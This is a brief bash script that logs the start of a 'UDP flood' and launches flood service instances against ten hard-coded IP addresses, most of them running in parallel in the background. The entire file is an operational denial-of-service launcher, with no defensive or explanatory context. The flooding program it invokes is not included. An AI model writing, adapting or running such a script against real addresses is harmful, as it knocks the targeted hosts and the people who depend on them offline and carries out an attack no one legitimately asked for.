#!/bin/bash
logger -s -t $0 "Starting UDP flood"
/usr/sbin/service udp-flood@27.128.0.21 start &
/usr/sbin/service udp-flood@175.45.178.13 start &
/usr/sbin/service udp-flood@109.230.200.204 start &
/usr/sbin/service udp-flood@27.128.6.45 start &
/usr/sbin/service udp-flood@175.45.178.84 start &
/usr/sbin/service udp-flood@109.230.200.200 start &
/usr/sbin/service udp-flood@27.128.200.8 start &
/usr/sbin/service udp-flood@175.45.178.162 start &
/usr/sbin/service udp-flood@109.230.200.78 start &
/usr/sbin/service udp-flood@27.128.41.119 start

sleep 5


